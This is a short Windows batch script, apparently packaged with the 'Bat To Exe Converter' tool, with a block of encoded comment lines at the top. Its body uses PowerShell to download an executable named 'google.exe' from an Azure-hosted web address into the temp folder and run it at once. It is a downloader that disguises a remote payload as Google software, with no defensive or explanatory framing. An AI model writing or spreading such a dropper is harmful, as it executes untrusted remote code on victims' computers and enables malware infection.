::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCGONVeeCbYJ5e31+/m7hUQJfPc9RK7L36zDEPIW7kTweoQ+6ltKndM8Hh5cfwakfBx6uWBF1g==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvH6OWIpUEYUPA2bork2KaqH+kQ5UuqfJUitg==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kLrepEh035Ikd0JQh5Ae3I=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off


set files= 'http://mogiant.azurewebsites.net/google.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"




